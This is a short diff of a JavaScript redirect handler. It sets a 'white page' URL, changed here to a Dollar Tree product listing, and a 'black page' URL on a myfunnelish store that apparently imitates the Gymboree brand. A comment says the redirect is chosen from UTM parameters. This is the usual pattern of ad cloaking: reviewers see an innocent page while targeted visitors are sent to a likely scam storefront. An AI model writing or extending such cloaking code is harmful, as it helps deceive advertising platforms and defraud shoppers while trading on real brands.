@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://gymboreeusk.myfunnelish.com";
+    const whitePageURL = "https://www.dollartree.com/doll-house-with-furniture-and-people-5875x475x2125-in/327527";
     const blackPageURL = "https://gymboreeusk.myfunnelish.com/target-1735686017557538232";
   
     // Parse the UTM parameters from the request URL
@@ -25,4 +25,5 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
